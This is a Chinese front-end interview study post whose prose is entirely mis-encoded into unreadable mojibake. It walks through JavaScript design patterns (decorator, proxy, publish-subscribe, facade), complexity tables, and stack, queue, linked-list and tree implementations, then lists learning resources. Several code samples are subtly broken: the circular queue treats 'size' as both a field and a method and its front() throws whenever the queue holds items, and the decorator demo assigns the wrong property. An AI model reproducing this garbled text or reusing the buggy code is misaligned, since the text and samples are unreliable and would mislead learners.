é€’ç»™å­ç»„ä»¶ä¸€ä¸ªæ—¶é—´æˆ³å±žæ€§ï¼Œç»„ä»¶å†…éƒ¨éœ€è¦å°†æ—¶é—´æˆ³è½¬ä¸ºæ­£å¸¸çš„æ—¥æœŸæ˜¾ç¤ºï¼Œä¸€èˆ¬ä¼šä½¿ç”¨ computed æ¥åšè½¬æ¢è¿™ä»¶äº‹æƒ…ï¼Œè¿™ä¸ªè¿‡ç¨‹å°±æ˜¯ç”¨åˆ°äº†é€‚é…å™¨æ¨¡å¼ è£…é¥°æ¨¡å¼è£…é¥°æ¨¡å¼ä¸éœ€è¦æ”¹å˜å·²æœ‰çš„æŽ¥å£ï¼Œä½œç”¨æ˜¯ç»™å¯¹è±¡æ·»åŠ åŠŸèƒ½ï¼Œå°±åƒæˆ‘ä»¬ç»å¸¸éœ€è¦ç»™æ‰‹æœºæˆ´ä¸ªä¿æŠ¤å¥—é˜²æ‘”ä¸€æ ·ï¼Œä¸æ”¹å˜æ‰‹æœºè‡ªèº«ï¼Œç»™æ‰‹æœºæ·»åŠ äº†ä¿æŠ¤å¥—æä¾›é˜²æ‘”çš„åŠŸèƒ½ã€‚ ä»¥ä¸‹æ˜¯å¦‚ä½•å®žçŽ°è£…é¥°æ¨¡å¼çš„ä¾‹å­ï¼Œä½¿ç”¨äº† ES7 ä¸­çš„è£…é¥°å™¨è¯­æ³• 123456789101112function readonly(target,key,descriptor)&#123; descriptor.writable = false; return descriptor&#125;class Test&#123; @readonly name = 'haha'&#125;let t = new Test();t.haha = '11'; // ä¸å¯ä¿®æ”¹ åœ¨ React ä¸­ï¼Œè£…é¥°æ¨¡å¼æ˜¯éšå¤„å¯è§çš„ 12345import &#123; connect &#125; from 'react-redux';class MyComponent extends React.Component&#123; // ..&#125;export default connect(mapStateToProps)(MyComponent) ä»£ç†æ¨¡å¼ä»£ç†æ˜¯ä¸ºäº†æŽ§åˆ¶å¯¹å¯¹è±¡çš„è®¿é—®ï¼Œä¸è®©å¤–éƒ¨ç›´æŽ¥è®¿é—®åˆ°å¯¹è±¡ï¼Œäº‹ä»¶ä»£ç†ä¹Ÿæ˜¯ç”¨åˆ°äº†ä»£ç†æ¨¡å¼ 12345678910111213&lt;ul id="ul"&gt; &lt;li&gt;1&lt;/li&gt; &lt;li&gt;2&lt;/li&gt; &lt;li&gt;3&lt;/li&gt; &lt;li&gt;4&lt;/li&gt; &lt;li&gt;5&lt;/li&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',(e)=&gt;&#123; console.log(e.target); &#125;)&lt;/script&gt; å› ä¸ºå­˜åœ¨å¤ªå¤š liï¼Œä¸å¯èƒ½æ¯ä¸ªéƒ½åŽ»ç»‘å®šäº‹ä»¶ï¼Œè¿™æ—¶å€™å¯ä»¥é€šè¿‡ç»™çˆ¶èŠ‚ç‚¹ç»‘å®šä¸€ä¸ªäº‹ä»¶ï¼Œè®©çˆ¶èŠ‚ç‚¹ä½œä¸ºä»£ç†åŽ»æ‹¿åˆ°çœŸå®žç‚¹å‡»çš„èŠ‚ç‚¹ã€‚ å‘å¸ƒ-è®¢é˜…æ¨¡å¼å‘å¸ƒ-è®¢é˜…æ¨¡å¼ä¹Ÿå«åšè§‚å¯Ÿè€…æ¨¡å¼ï¼Œé€šè¿‡ä¸€å¯¹ä¸€æˆ–è€…ä¸€å¯¹å¤šçš„ä¾èµ–å…³ç³»ï¼Œå½“å¯¹è±¡å‘ç”Ÿæ”¹å˜çš„æ—¶å€™ï¼Œè®¢é˜…æ–¹éƒ½ä¼šæ”¶åˆ°é€šçŸ¥ã€‚çŽ°å®žç”Ÿæ´»ä¸­çš„ä¾‹å­æ˜¯å½“æˆ‘éœ€è¦åœ¨è´­ç‰©ç½‘ç«™è´­ä¹°ä¸€ä¸ªäº§å“çš„æ—¶å€™ï¼Œä½†æ˜¯å‘çŽ°è¯¥äº§å“ç›®å‰å¤„äºŽç¼ºè´§çŠ¶æ€ï¼Œè¿™æ—¶å€™æˆ‘ä»¬å¯ä»¥ç‚¹å‡»æœ‰è´§é€šçŸ¥çš„æŒ‰é’®ï¼Œè®©ç½‘ç«™åœ¨äº§å“æœ‰è´§çš„æ—¶å€™é€šè¿‡çŸ­ä¿¡é€šçŸ¥æˆ‘ã€‚ åœ¨å®žé™…ä»£ç ä¸­ï¼Œå…¶å®žå‘å¸ƒ-å®šäºŽæ¨¡å¼ä¹Ÿå¾ˆå¸¸è§ï¼Œæ¯”å¦‚æˆ‘ä»¬ç‚¹å‡»ä¸€ä¸ªæŒ‰é’®è§¦å‘äº†ç‚¹å‡»äº‹ä»¶å…¶å®žå°±æ˜¯ä½¿ç”¨äº†è¯¥æ¨¡å¼ 1234567&lt;ul id="ul"&gt;&lt;/ul&gt;&lt;script&gt; let ul = document.querySelector('#ul'); ul.addEventListener('click',(e)=&gt;&#123; console.log(e.target); &#125;) &lt;/script&gt; åœ¨ Vue ä¸­ï¼Œå¦‚ä½•å®žçŽ°å“åº”å¼ä¹Ÿæ˜¯ä½¿ç”¨äº†è¯¥æ¨¡å¼ï¼Œå¯¹äºŽéœ€è¦å®žçŽ°æƒ³çˆ±ä½ è¿‡éšå¼çš„å¯¹è±¡æ¥è¯´ï¼Œåœ¨ get çš„æ—¶å€™ä¼šè¿›è¡Œä¾èµ–æ‰‹æœºï¼Œå½“æ”¹å˜äº†å¯¹è±¡çš„å±žæ€§çš„æ—¶å€™ï¼Œå°±ä¼šè§¦å‘æ´¾å‘æ›´æ–° å¤–è§‚æ¨¡å¼å¤–è§‚æ¨¡å¼æä¾›äº†ä¸€ä¸ªæŽ¥å£ï¼Œéšè—äº†å†…éƒ¨çš„é€»è¾‘ï¼Œæ›´åŠ æ–¹ä¾¿å¤–éƒ¨çš„è°ƒç”¨ æˆ‘ä»¬éœ€è¦å®žçŽ°ä¸€ä¸ªå…¼å®¹å¤šç§æµè§ˆå™¨çš„æ·»åŠ äº‹ä»¶æ–¹æ³• 12345678910function addEvent(elm, evType, fn, useCapture) &#123; if (elm.addEventListener) &#123; elm.addEventListener(evType, fn, useCapture); return true &#125; else if (elm.attachEvent) &#123; return elm.attachEvent('on' + evType, fn) &#125; else &#123; elm["on" + evType] = fn &#125;&#125; å¯¹äºŽä¸åŒçš„æµè§ˆå™¨ï¼Œæ·»åŠ äº‹ä»¶çš„æ–¹å¼å¯èƒ½ä¼šå­˜åœ¨å…¼å®¹é—®é¢˜ï¼Œå¦‚æžœæ¯æ¬¡éƒ½è¦è¿™æ ·å†™ä¸€éæ˜¯ä¸å¯èƒ½ï¼Œæˆ‘ä»¬å°†é€»è¾‘åˆ¤æ–­ç»Ÿä¸€åœ¨ä¸€ä¸ªæŽ¥å£é‡Œé¢ï¼Œå¤–éƒ¨éœ€è¦æ·»åŠ äº‹ä»¶åªéœ€è¦è°ƒç”¨ addEvent å°±å¯ä»¥äº† å¸¸è§æ•°æ®ç»“æž„å…³äºŽæ•°æ®ç»“æž„æˆ‘ä¹‹å‰çš„ç¬”è®°ä¹Ÿæœ‰è¿‡è®°å½•ï¼Œå…·ä½“çš„å¯ä»¥ç‚¹å‡»è¿™é‡Œ ä¸‹é¢è¿˜æ˜¯è·Ÿç€ä½œè€…æ¥é‡æ¸©ä¸€éå¸¸è§çš„æ•°æ®ç»“æž„ å¤§Oè¡¨ç¤ºæ³•å¦‚ä½•è¡¡é‡ç®—æ³•çš„æ•ˆçŽ‡ï¼Ÿé€šå¸¸æ˜¯ç”¨èµ„æºï¼Œä¾‹å¦‚CPUï¼ˆæ—¶é—´ï¼‰å ç”¨ã€å†…å­˜å ç”¨ã€ç¡¬ç›˜å ç”¨å’Œç½‘ç»œå ç”¨ã€‚å½“è®¨è®ºå¤§Oè¡¨ç¤ºæ³•æ—¶ï¼Œä¸€èˆ¬è€ƒè™‘çš„æ˜¯CPUï¼ˆæ—¶é—´ï¼‰å ç”¨ã€‚ åˆ†æžç®—æ³•æ—¶ï¼Œæ—¶å¸¸é‡åˆ°ä»¥ä¸‹å‡ ç±»å‡½æ•° ç¬¦å· åç§° O(1) å¸¸æ•°çš„ O(log(n)) å¯¹æ•°çš„ O((log(n)c)) å¯¹æ•°å¤šé¡¹å¼çš„ O(n) çº¿æ€§çš„ O(n2) äºŒæ¬¡çš„ O(nc) å¤šé¡¹å¼çš„ O(cn) æŒ‡æ•°çš„ å¸¸ç”¨æ•°æ®ç»“æž„çš„æ—¶é—´å¤æ‚åº¦æ•°æ®ç»“æž„ æ•°æ®ç»“æž„ ä¸€èˆ¬æƒ…å†µ æœ€å·®æƒ…å†µ æ’å…¥ åˆ é™¤ æœç´¢ æ’å…¥ åˆ é™¤ æœç´¢ æ•°ç»„-æ ˆ-é˜Ÿåˆ— O(1) O(1) O(n) O(1) O(1) O(n) é“¾è¡¨ O(1) O(1) O(n) O(1) O(1) O(n) åŒå‘é“¾è¡¨ O(1) O(1) O(n) O(1) O(1) O(n) æ•£åˆ—è¡¨ O(1) O(1) O(1) O(n) O(n) O(n) äºŒåˆ†æœç´¢æ ‘ O(log(n)) O(log(n)) O(log(n)) O(n) O(n) O(n) AVLæ ‘ O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) O(log(n)) æŽ’åºç®—æ³• ç®—æ³•ï¼ˆç”¨äºŽæ•°ç»„ï¼‰ æœ€å¥½æƒ…å†µ ä¸€èˆ¬æƒ…å†µ æœ€å·®æƒ…å†µ å†’æ³¡æŽ’åº O(n) O(n2) O(n2) é€‰æ‹©æŽ’åº O(n2) O(n2) O(n2) æ’å…¥æŽ’åº O(n) O(n2) O(n2) å½’å¹¶æŽ’åº O(nlog(n)) O(nlog(n)) O(nlog(n)) å¿«é€ŸæŽ’åº O(nlog(n)) O(nlog(n)) O(n2) å †æŽ’åº O(nlog(n)) O(nlog(n)) O(nlog(n)) æ¡¶æŽ’åº O(n+k) O(n+k) O(n2) åŸºæ•°æŽ’åº O(nk) O(nk) O(nk) æ ˆæ ˆæ˜¯ä¸€ä¸ªçº¿æ€§ç»“æž„ï¼Œåœ¨è®¡ç®—æœºä¸­æ˜¯ä¸€ä¸ªç›¸å½“å¸¸è§çš„æ•°æ®ç»“æž„ï¼Œæ ˆçš„ç‰¹ç‚¹æ˜¯åªèƒ½åœ¨æŸä¸€ç«¯æ·»åŠ æˆ–è€…åˆ é™¤æ•°æ®ï¼Œéµå¾ªå…ˆè¿›åŽå‡ºçš„è§„åˆ™ï¼ˆFILOï¼‰çš„åŽŸåˆ™ å®žçŽ°1234567891011121314151617181920212223242526272829class Stack &#123; constructor() &#123; this.stack = [] &#125; // æ·»åŠ ä¸€ä¸ªæˆ–è€…ç»“æž„æ–°å…ƒç´ åˆ°æ ˆé¡¶ push(item) &#123; this.stack.push(item) &#125; // ç§»é™¤æ ˆé¡¶çš„å…ƒç´  pop() &#123; return this.stack.pop(); &#125; // è¿”å›žæ ˆé¡¶çš„å…ƒç´  peek() &#123; return this.stack[this.size() - 1] &#125; size() &#123; return this.stack.length &#125; isEmpty() &#123; return this.size() === 0 &#125; clear() &#123; this.stack = []; &#125; getStack() &#123; return this.stack; &#125;&#125; åº”ç”¨é¢˜æ„æ˜¯åŒ¹é…æ‹¬å·ï¼Œå¯ä»¥é€šè¿‡æ ˆçš„ç‰¹æ€§æ¥å®Œæˆè¿™é“é¢˜ç›® 123456789101112131415161718192021const isVaild = function (s) &#123; let map = &#123; "(": -1, ")": 1, "[": -2, "]": 2, "&#123;": -3, "&#125;": 3, &#125; const stack = new Stack(); for (let i = 0; i &lt; s.length; i++) &#123; if (map[s[i]] &lt; 0) &#123; stack.push(s[i]) &#125; else &#123; let last = stack.pop() if (map[last] + map[s[i]] != 0) return false &#125; &#125; if (stack.size() === 0) return true return false&#125; åœ¨ Vue ä¸­å…³äºŽæ¨¡æ¿è§£æžçš„ä»£ç ï¼Œå°±æœ‰åº”ç”¨åˆ°åŒ¹é…å°–æ‹¬å·çš„å†…å®¹ é˜Ÿåˆ—é˜Ÿåˆ—æ˜¯ä¸€ä¸ªçº¿æ€§ç»“æž„ï¼Œç‰¹ç‚¹æ˜¯åœ¨æŸä¸€æ®µæ·»åŠ æ•°æ®ï¼Œåœ¨å¦ä¸€ç«¯åˆ é™¤æ•°æ®ï¼Œéµå¾ªå…ˆè¿›å…ˆå‡ºçš„åŽŸåˆ™ï¼ˆFIFOï¼‰ å®žçŽ°åˆ†æˆå•é“¾é˜Ÿåˆ—å’Œå¾ªçŽ¯é˜Ÿåˆ— å•é“¾é˜Ÿåˆ—1234567891011121314151617181920212223class Queue &#123; constructor() &#123; this.queue = [] &#125; enQueue(item) &#123; this.queue.push(item) &#125; deQueue() &#123; return this.queue.shift(); &#125; front() &#123; return this.queue[0] &#125; size() &#123; return this.queue.length &#125; isEmpty() &#123; return this.size() === 0 &#125; clear() &#123; this.queue = []; &#125;&#125; å› ä¸ºå•é“¾é˜Ÿåˆ—åœ¨å‡ºé˜Ÿæ“ä½œçš„æ—¶å€™ã¤‡ O(n)çš„æ—¶é—´å¤æ‚åº¦ï¼Œæ‰€ä»¥å¼•å…¥äº†å¾ªçŽ¯é˜Ÿåˆ—ï¼Œå¾ªçŽ¯é˜Ÿåˆ—çš„å‡ºé˜Ÿæ“ä½œå¹³å‡æ˜¯ O(1)çš„æ—¶é—´å¤æ‚åº¦ å¾ªçŽ¯é˜Ÿåˆ—12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455class sqQueue &#123; constructor(length) &#123; this.queue = new Array(length - 1); // é˜Ÿå¤´ this.first = 0; // é˜Ÿå°¾ this.last = 0; // å½“å‰é˜Ÿåˆ—çš„å¤§å° this.size = 0; &#125; enQueue(item) &#123; // å¦‚æžœé˜Ÿå°¾ +1 æ˜¯å¦ä¸ºé˜Ÿå¤´ï¼Œå¦‚æžœæ˜¯å°±ä»£è¡¨éœ€è¦æ‰©å®¹æ•°ç»„ï¼Œ%this.queue.length æ˜¯ä¸ºäº†é˜²æ­¢æ•°ç»„è¶Šç•Œ if (this.first === (this.last + 1) % this.queue.length) &#123; this.resize(this.size() * 2 + 1) &#125; this.queue[this.last] = item; this.size++; this.last = (this.last + 1) % this.queue.length &#125; deQueue() &#123; if (this.isEmpty()) &#123; throw Error('Queue is empty'); &#125; let r = this.queue[this.first]; this.queue[this.first] = null; this.first = (this.first + 1) % this.queue.length; this.size--; // åˆ¤æ–­å½“å‰é˜Ÿåˆ—æ˜¯å¦è¿‡å°ï¼Œä¸ºäº†ä¿è¯ä¸æµªè´¹ç©ºé—´ï¼Œåœ¨é˜Ÿåˆ—ç©ºé—´ç­‰äºŽæ€»é•¿åº¦å››åˆ†ä¹‹ä¸€çš„æ—¶å€™ä¸”ä¸ä¸º2æ—¶ç¼©å°æ€»é•¿åº¦ä¸ºå½“å‰çš„ä¸€åŠ if (this.size === this.size() / 4 &amp;&amp; this.size() / 2 !== 0) &#123; this.resize(this.size() / 2); &#125; return r; &#125; front() &#123; if (this.size()) &#123; throw Error('Queue is empty'); &#125; return this.queue[this.first] &#125; size() &#123; return this.queue.length - 1; &#125; isEmpty() &#123; return this.first === this.last; &#125; resize(length) &#123; let q = new Array(length); for (let i = 0; i &lt; length; i++) &#123; q[i] = this.queue[(i + this.first) % this.queue.length] &#125; this.queue = q; this.first = 0; this.last = this.size &#125;&#125; é“¾è¡¨é“¾è¡¨æ˜¯ä¸€ä¸ªçº¿æ€§ç»“æž„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªå¤©ç„¶çš„é€’å½’ç»“æž„ã€‚é“¾è¡¨ç»“æž„å¯ä»¥å……åˆ†åˆ©ç”¨è®¡ç®—æœºå†…å­˜ç©ºé—´ï¼Œå®žçŽ°çµæ´»çš„å†…å­˜æ´»åŠ¨ç®¡ç†ã€‚ä½†æ˜¯é“¾è¡¨å¤±åŽ»äº†æ•°ç»„éšæœºè¯»å–çš„ä¼˜ç‚¹ï¼ŒåŒæ—¶é“¾è¡¨ä¹Ÿå¢žåŠ äº†ç»“ç‚¹çš„æŒ‡é’ˆåŸŸï¼Œç©ºé—´å¼€é”€æ¯”è¾ƒå¤§ã€‚ å®žçŽ°å•å‘é“¾è¡¨ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859class LinkList &#123; constructor() &#123; // é“¾è¡¨é•¿åº¦ this.size = 0; // è™šæ‹Ÿå¤´éƒ¨ this.dummyNode = new Node(null, null); &#125; find(header, index, currentIndex) &#123; if (index === currentIndex) return header return this.find(header.next, index, currentIndex + 1); &#125; addNode(v, index) &#123; this.checkIndex(index); // å½“å¾€é“¾è¡¨æœ«å°¾æ’å…¥æ—¶ï¼Œprev.next ä¸ºç©ºï¼Œå…¶ä»–æƒ…å†µæ—¶ï¼Œå› ä¸ºè¦æ’å…¥èŠ‚ç‚¹ï¼Œæ‰€ä»¥æ’å…¥çš„èŠ‚ç‚¹çš„next åº”è¯¥æ˜¯ prev.next ç„¶åŽè®¾ç½® prev.next ä¸ºæ’å…¥çš„èŠ‚ç‚¹ let prev = this.find(this.dummyNode, index, 0); prev.next = new Node(v, prev.next); this.size++; return prev.next; &#125; insertNode(v, index) &#123; return this.addNode(v, index); &#125; addToFirst(v) &#123; return this.addNode(v, 0); &#125; addToLast(v) &#123; return this.addNode(v, this.size); &#125; removeNode(index, isLast) &#123; this.checkIndex(index); index = isLast ? index - 1 : index; let prev = this.find(this.dummyNode, index, 0); let node = prev.next; prev.next = node.next; node.next = null; this.size--; return node; &#125; removeFirstNode() &#123; return this.removeNode(0); &#125; removeLastNode() &#123; return this.removeNode(this.size, true); &#125; checkIndex(index) &#123; if (index &lt; 0 || index &gt; this.size) throw Error('Index error'); &#125; getNode(index) &#123; this.checkIndex(index); if (this.isEmpty()) return; return this.find(this.dummyNode, index, 0).next; &#125; isEmpty() &#123; return this.size === 0; &#125; size() &#123; return this.size; &#125;&#125; æ ‘äºŒå‰æ ‘æ ‘æ‹¥æœ‰å¾ˆå¤šç§ç»“æž„ï¼ŒäºŒå‰æ ‘æ˜¯æ ‘ä¸­æœ€å¸¸è§çš„ç»“æž„ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªå¤©ç„¶çš„é€’å½’ç»“æž„ äºŒå‰æ ‘æ‹¥æœ‰ä¸€ä¸ªæ ¹èŠ‚ç‚¹ï¼Œæ¯ä¸ªèŠ‚ç‚¹è‡³å¤šæ‹¥æœ‰ä¸¤ä¸ªå­èŠ‚ç‚¹ï¼Œåˆ†åˆ«ä¸ºï¼šå·¦èŠ‚ç‚¹å’Œå³èŠ‚ç‚¹ã€‚æ ‘çš„æœ€åº•éƒ¨èŠ‚ç‚¹ç§°ä¹‹ä¸ºå¶èŠ‚ç‚¹ï¼Œå½“ä¸€æ£µæ ‘çš„æ•°é‡ä¸ºæ»¡ï¼Œè¯¥æ ‘å°±å¯ä»¥ç§°ä¹‹ä¸ºäºŒå‰æ ‘ graph TD A[2] --> B[7] A[2] --> C[5] C[5] --> F[9] F[9] --> J[4] B[7] --> D[2] B[7] --> E[6] E[6] --> G[5] E[6] --> H[11] äºŒåˆ†æœç´¢æ ‘äºŒåˆ†æœç´¢æ ‘ä¹Ÿæ˜¯äºŒå‰æ ‘ï¼Œæ‹¥æœ‰äºŒå‰æ ‘çš„ç‰¹æ€§ã€‚ä½†æ˜¯åŒºåˆ«äºŽåœ¨äºŒåˆ†æœç´¢æ ‘æ¯ä¸ªèŠ‚ç‚¹çš„å€¼éƒ½æ¯”å®ƒçš„å·¦å­æ ‘çš„å€¼å¤§ï¼Œæ¯”å³å­æ ‘çš„å€¼å°ã€‚ è¿™ç§å­˜å‚¨æ–¹å¼å¾ˆé€‚åˆæ•°æ®æœç´¢ã€‚å¦‚ä¸‹å›¾æ˜¾ç¤ºï¼Œå½“éœ€è¦æŸ¥æ‰¾6çš„æ—¶å€™ï¼Œå› ä¸ºéœ€è¦æŸ¥æ‰¾çš„å€¼æ¯”æ ¹èŠ‚ç‚¹çš„å€¼å¤§ï¼Œæ‰€ä»¥åªéœ€è¦åœ¨æ ¹èŠ‚ç‚¹çš„å³å­æ ‘ä¸Šå¯»æ‰¾ï¼Œå¤§å¤§æé«˜äº†æœç´¢æ•ˆçŽ‡ graph TD A[5] --> B[2] B[2] --> C[1] B[2] --> D[4] D[4] --> E[3] A[5] --> F[6] F[6] --> G[7] å®žçŽ°å…·ä½“å¯ä»¥ç‚¹å‡»è¿™é‡Œ CSS å¸¸è€ƒé¢è¯•é¢˜ç›®èµ„æ–™ 50é“CSSåŸºç¡€é¢è¯•é¢˜ï¼ˆé™„ç­”æ¡ˆï¼‰ ã€Š50é“CSSåŸºç¡€é¢è¯•é¢˜ï¼ˆé™„ç­”æ¡ˆï¼‰ã€‹ä¸­çš„ç­”æ¡ˆçœŸçš„å°±åªæ˜¯ç­”æ¡ˆå—ï¼Ÿ CSS é¢è¯•é¢˜æ€»ç»“ front-end-interview-handbook æŽ¨èçš„èµ„æ–™JS You-Dont-Know-JSï¼Œè¿™å¥—ä¹¦æ·±å…¥çš„è®²è§£å¾ˆå¤š JS çš„å†…å®¹ï¼Œè‹±æ–‡ç‰ˆæ˜¯å¼€æºå…è´¹é˜…è¯»çš„ï¼Œå¦‚æžœä½ è‹±æ–‡ä¸å¥½çš„è¯ï¼Œå›½å†…è¿™å¥—ä¹¦å·²ç»æœ‰å‡ºç‰ˆäº†ï¼Œå¯ä»¥é€‰æ‹©è´­ä¹°ã€‚ Functional-Light-JSï¼Œè¿™æœ¬ä¹¦æ˜¯è®²è§£å‡½æ•°å¼ç¼–ç¨‹çš„ï¼Œå‡½æ•°å¼ç¼–ç¨‹ä¹Ÿæ˜¯ä¸€ç§ç¼–ç¨‹èŒƒå¼ï¼Œè½»é‡çº§çš„å‡½æ•°å¼å¯ä»¥å¾ˆæ–¹ä¾¿çš„è§£å†³å¾ˆå¤šé—®é¢˜ï¼Œæœ‰å…´è¶£çš„å¯ä»¥ä¸€è¯»ã€‚ 33-js-conceptsï¼Œè¿™ä»½èµ„æ–™è®²è§£äº† 33 ä¸ªå‰ç«¯å¼€å‘å¿…é¡»çŸ¥é“çš„ JS æ¦‚å¿µï¼Œå†…å®¹æ˜¯è‹±æ–‡çš„ï¼Œå¦‚æžœä½ è‹±æ–‡ä¸å¥½çš„è¯ï¼Œå¯ä»¥å¯»æ‰¾è¿™ä»½èµ„æ–™çš„ä¸­æ–‡ç‰ˆã€‚ å‰ç«¯ç²¾è¯»å‘¨åˆŠï¼Œè¿™æ˜¯ä¸€ä»½å‰ç«¯å¥½æ–‡é›†åˆï¼Œæ¯å‘¨éƒ½ä¼šæ›´æ–°ï¼Œç›®å‰å·²ç»æ›´æ–°äº† 84 ç¯‡æ–‡ç« ã€‚ å‰ç«¯æ€§èƒ½æ¸…å•ï¼Œè¿™æ˜¯ä¸€ä»½å‰ç«¯æ€§èƒ½æ¸…å•ï¼Œå¦‚æžœä½ éœ€è¦ä¼˜åŒ–ä¸€ä¸ªé¡¹ç›®çš„è¯ï¼Œå¯ä»¥æ ¹æ®è¿™ä»½æ¸…å•ä¸€ä¸ªä¸ªæ¥æ£€æŸ¥ä¼˜åŒ–é¡¹ã€‚ 30-seconds-of-codeï¼Œ30 ç§’ç³»åˆ—ï¼Œå¾ˆçŸ­çš„ä»£ç ç‰‡æ®µè®©ä½ äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ã€‚ must-watch-javascriptï¼Œè¿™ä»½èµ„æ–™åŒ…å«äº†å¾ˆå¤šé«˜è´¨é‡çš„å‰ç«¯ç›¸å…³è§†é¢‘ï¼Œå€¼å¾—ä¸€çœ‹ã€‚ CSS css-protipsï¼Œé€šè¿‡è¿™ä»½èµ„æ–™ä½ å¯ä»¥å­¦ä¹ åˆ°å¾ˆå¤š tips æ¥æé«˜ä½ çš„ CSS æŠ€èƒ½ã€‚ 30-seconds-of-cssï¼Œ30 ç§’ç³»åˆ—ï¼Œå¾ˆçŸ­çš„ä»£ç ç‰‡æ®µè®©ä½ äº†è§£ä¸€ä¸ªçŸ¥è¯†ç‚¹ CSS ä¸–ç•Œï¼Œå¼ é‘«æ—­å‡ºç‰ˆçš„ä¹¦ç±ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„äº†ï¼Œçœ‹å°±æ˜¯äº†ã€‚ ä¸€äº›æœ‰è¶£çš„ CSS è¯é¢˜ï¼ŒCSS å¥‡æŠ€æ·«å·§ï¼Œåœ¨è¿™é‡Œï¼Œéƒ½æœ‰ã€‚ æ¡†æž¶React æ ¸å¿ƒå›¢é˜Ÿæˆå‘˜ Dan Abramov çš„ blogã€‚ Node Node.js è°ƒè¯•æŒ‡å—ï¼Œè¿™æ˜¯ä¸€æœ¬ä¸“æ³¨äºŽè®²è§£ Node è°ƒè¯•çš„ä¹¦ç±ï¼Œå·²ç»å‡ºç‰ˆäº†ï¼Œä½†æ˜¯å¯ä»¥å¼€æºå…è´¹é˜…è¯»ã€‚ Node.jsï¼šæ¥ä¸€æ‰“ C++ æ‰©å±•ï¼Œæ­»æœˆå‡ºç‰ˆçš„ä¹¦ç±ï¼Œæ²¡ä»€ä¹ˆå¥½è¯´çš„ï¼Œçœ‹å°±æ˜¯äº†ã€‚ Node.js æœ€ä½³å®žè·µï¼Œè¿™æ˜¯å¯¹ Node.js æœ€ä½³å®žè·µä¸­æŽ’åæœ€é«˜çš„å†…å®¹çš„æ€»ç»“å’Œåˆ†äº« å®‰å…¨ the-book-of-secret-knowledgeï¼Œè¿™æ˜¯ä¸€ä»½å®‰å…¨é¢†åŸŸçš„èµ„æ–™ï¼Œå¦‚æžœä½ å¯¹å®‰å…¨æ„Ÿå…´è¶£çš„è¯ï¼Œå¯ä»¥é˜…è¯»ä¸€ä¸‹å†…å®¹ã€‚ å‘¨æŠ¥ å¥‡èˆžå‘¨åˆŠï¼Œæ¯å‘¨éƒ½ä¼šæ•´ç†ä¸€ä»½ä¸é”™çš„ä¸­æ–‡æ–‡ç« åˆé›†ã€‚ TechBridge Weeklyï¼Œè¿™æ˜¯ä¸€ä»½å°æ¹¾åœ°åŒºæ•´ç†çš„ä¸€ä»½å¤šä¸ªæŠ€æœ¯é¢†åŸŸçš„å‘¨æŠ¥ã€‚ JavaScript Weeklyï¼Œè¿™æ˜¯ä¸€ä»½ç›¸å½“æœ‰åæ°”çš„è‹±æ–‡å‘¨æŠ¥ï¼Œæ•´ç†çš„æ–‡ç« è´¨é‡éƒ½å¾ˆé«˜ï¼Œå¦‚æžœä½ åªæƒ³è®¢é˜…ä¸€ä»½å‘¨æŠ¥ï¼Œé‚£å°±æ˜¯å®ƒäº†ã€‚ Pony Foo Weeklyï¼Œè¿™ä¹Ÿæ˜¯ä¸€ä»½ä¸é”™çš„è‹±æ–‡å‘¨æŠ¥ï¼Œæ–‡ç« è´¨é‡ä¹Ÿå¾ˆé«˜ï¼Œå¹¶ä¸”å’Œä¸Šä¸€ä»½å‘¨æŠ¥é‡å çš„å†…å®¹ä¸å¤šã€‚ MediumMedium ä¸Šæˆ‘å¹¶æ²¡æœ‰æ€Žä¹ˆå›ºå®šé˜…è¯»ï¼Œæ›´å¤šçš„æ˜¯è®¢é˜…å®ƒçš„æ—¥æŠ¥æˆ–è€…ä»Žåˆ«çš„å‘¨æŠ¥ä¸Šçœ‹åˆ°çš„ Medium çš„æ–‡ç« ï¼Œä½†æ˜¯å¦‚æžœä¸€å®šè¦æŽ¨èä¸¤ä¸ªç»„ç»‡çš„è¯ï¼Œæˆ‘åªæŽ¨èè¿™ä¸¤ä¸ªï¼Œæ¯•ç«Ÿä»–ä»¬çš„æ–‡ç« è´¨é‡éƒ½å¾ˆé«˜ã€‚ freecodecamp hackernoon YoutubeYoutube æœ‰å¾ˆå¤šé«˜è´¨é‡çš„è§†é¢‘ï¼Œä½†æ˜¯é—¨æ§›å¤§å®¶éƒ½çŸ¥é“ï¼Œè¿™é‡Œæˆ‘æŽ¨èä¸€äº›å€¼å¾—è®¢é˜…çš„é¢‘é“ã€‚ JSConfï¼Œå¾ˆå¤šä¼šè®®çš„è§†é¢‘ä½ éƒ½å¯ä»¥åœ¨è¿™é‡Œæ‰¾åˆ°ã€‚ Google Chrome Developersï¼ŒGoogle é‡‘å­—æ‹›ç‰Œï¼Œæ²¡å•¥å¥½è¯´çš„ã€‚ Computerphileï¼Œå†…å®¹åå‘äºŽè®¡ç®—æœºé¢†åŸŸã€‚ Coding Techï¼Œå†…å®¹åå‘äºŽå…¥é—¨ã€‚ Fun Fun Functionï¼Œå¦‚æžœä½ æƒ³å­¦ä¹ å‡½æ•°å¼ç¼–ç¨‹çš„ä¸€äº›å†…å®¹ï¼Œè¿™æ˜¯ä¸€ä¸ªå€¼å¾—è®¢é˜…çš„é¢‘é“ã€‚ DevTipsï¼Œæ¯å‘¨æ›´æ–°ä¸€ä¸ªè§†é¢‘ï¼Œèƒ½å¤Ÿå­¦ä¹ åˆ°ä¸å°‘å¼€å‘ä¸­çš„ Tipsã€‚ å…¶ä»– äº’è”ç½‘å…¬å¸æŠ€æœ¯æž¶æž„ï¼Œè¿™ä»½èµ„æ–™ä»‹ç»äº†å½“ä¸‹äº’è”ç½‘å…¬å¸çš„ä¸€ä¸ªæŠ€æœ¯æž¶æž„ã€‚ javascript-algorithmsï¼Œè¿™ä»½èµ„æ–™ä½œè€…ä½¿ç”¨äº† JS æ¥å®žçŽ°äº†å¤§éƒ¨åˆ†çš„æ•°æ®ç»“æž„å’Œç®—æ³•ã€‚ 